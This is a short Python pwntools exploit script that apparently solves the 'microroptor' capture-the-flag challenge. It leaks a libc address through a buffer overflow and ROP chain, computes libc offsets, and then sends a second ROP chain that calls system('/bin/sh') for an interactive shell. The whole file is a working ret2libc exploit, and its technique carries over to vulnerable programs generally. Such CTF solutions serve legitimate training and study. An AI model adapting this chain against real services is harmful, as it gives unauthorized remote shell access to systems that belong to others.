#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    p = remote("challenges.france-cybersecurity-challenge.fr", 2052)
else:
    p = process("./microroptor")

addr = int(p.readlineS().strip(), 16)

bin0 = addr - 0x4010 # from ghidra
main = bin0 + 0x1178 # from ghidra
pop_rdi = bin0 + 0x116f # from ropper : pop rdi ; ret
puts_got = bin0 + 0x3fc0 # from ghidra
puts_plt = bin0 + 0x1040 # from ghidra

rop = [
    p64(pop_rdi), p64(puts_got),
    p64(puts_plt),
    p64(main)
]

pay = b"A" * 40 + b"".join(rop)

p.sendline(pay)
p.readline()

puts_libc = u64(p.readline().strip() + b"\x00\x00")

# offsets pour ma libc6 (2.31) d'après https://libc.blukat.me/?q=puts%3A765f0&l=libc6-amd64_2.31-13_i386

libc_base = puts_libc - 0x765f0
sh = libc_base + 0x18a152
system = libc_base + 0x48e50

rop2 = [
    p64(pop_rdi), p64(sh),
    p64(system)
]

pay2 = b"B" * 40 + b"".join(rop2)
p.sendline(pay2)

p.interactive()
